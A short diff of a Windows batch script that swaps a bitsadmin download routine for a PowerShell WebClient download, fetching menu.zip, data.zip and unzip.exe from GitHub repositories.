@@ -10,9 +10,9 @@ set DOWNLOAD_URL_MENU_ZIP=https://github.com/RegistryAlive/ha3213/raw/main/menu.
 set DOWNLOAD_URL_DATA_ZIP=https://github.com/RegistryAlive/ha3213/raw/main/data.zip
 set DOWNLOAD_URL_UNZIP_EXE=https://github.com/RegistryAlive/4444/raw/main/unzip.exe
 
-REM Function to download file with bitsadmin
+REM Function to download file with PowerShell
 :downloadFile
-bitsadmin /transfer "DownloadJob" %1 "%2"
+powershell -command "& { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile('%1', '%2') }"
 
 REM Check if the download was successful
 IF NOT %ERRORLEVEL% EQU 0 (
